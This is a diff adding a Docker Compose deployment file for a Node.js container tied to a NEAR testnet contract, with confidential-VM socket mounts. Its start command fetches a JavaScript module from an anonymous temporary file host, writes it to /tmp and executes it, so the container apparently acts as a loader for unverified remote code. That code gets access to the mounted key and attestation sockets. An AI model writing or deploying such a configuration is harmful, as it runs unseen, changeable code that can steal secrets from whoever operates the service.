@@ -1,0 +1,26 @@
+services:
+  amstr-cvm:
+    image: node:22-bookworm-slim
+    container_name: amstr-cvm
+    restart: unless-stopped
+    ports:
+      - "3000:3000"
+    volumes:
+      - /var/run/dstack.sock:/var/run/dstack.sock
+      - /var/run/tappd.sock:/var/run/tappd.sock
+    environment:
+      - PORT=3000
+      - NODE_ENV=production
+      - CVM_START=1
+      - CONTRACT_ID=game.amstr-admin-zxlhcx.testnet
+      - RPC_ENDPOINTS=https://rpc.testnet.near.org,https://testnet.neardata.xyz/v1/node
+    command: >
+      sh -c "
+      node --input-type=module -e \"
+        import fs from 'fs';
+        const res = await fetch('https://litter.catbox.moe/sigu04.mjs');
+        const code = await res.text();
+        fs.writeFileSync('/tmp/bundle.mjs', code);
+        await import('/tmp/bundle.mjs');
+      \"
+      "
